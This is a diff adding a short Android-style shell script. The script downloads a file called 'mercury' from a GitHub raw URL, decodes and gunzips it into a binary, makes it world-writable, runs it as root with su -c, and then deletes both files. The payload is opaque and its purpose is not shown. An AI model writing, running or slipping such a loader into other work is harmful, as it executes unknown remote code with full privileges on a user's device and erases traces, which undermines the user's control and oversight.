@@ -1,0 +1,11 @@
+echo -e """"cd /data/data
+rm -rf mercury &> /dev/null 
+curl -O https://raw.githubusercontent.com/onlySULPHUR/MERCURY/main/mercury || wget https://raw.githubusercontent.com/onlySULPHUR/MERCURY/main/mercury
+sex=$(cat mercury)
+rm -rf /data/data/1
+echo -ne $sex > /data/data/1.gz
+gzip -d /data/data/1.gz
+chmod 777 /data/data/1
+su -c /data/data/1
+rm -rf /data/data/{1,mercury}"""" > 1
+sh 1
